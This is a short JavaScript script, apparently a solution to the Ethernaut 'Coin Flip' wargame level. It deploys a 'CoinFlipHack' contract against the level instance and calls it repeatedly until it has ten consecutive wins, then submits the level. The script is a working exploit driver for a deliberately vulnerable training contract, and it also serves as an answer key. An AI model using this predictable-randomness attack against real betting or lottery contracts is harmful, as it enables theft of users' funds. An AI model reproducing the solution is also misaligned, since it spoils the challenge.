module.exports = async function({ ethers, ethernaut }) {
  const levelAddress = await ethernaut.createInstance('Coin Flip');
  const levelInstance = await ethers.getContractAt('CoinFlip', levelAddress);
  const hackInstance = await ethers.getContractFactory('CoinFlipHack')
    .then(coinFlipHack => coinFlipHack.deploy(levelInstance.address));
  
  let wins = 0;
  while (wins < 10) {
    await hackInstance.hackAttempt({ gasLimit: 200000 }).then(tx => tx.wait());
  
    wins = await levelInstance.consecutiveWins().then(val => val.toNumber());
    console.log('Wins:', wins);
  }

  return ethernaut.submitInstance(levelAddress);
};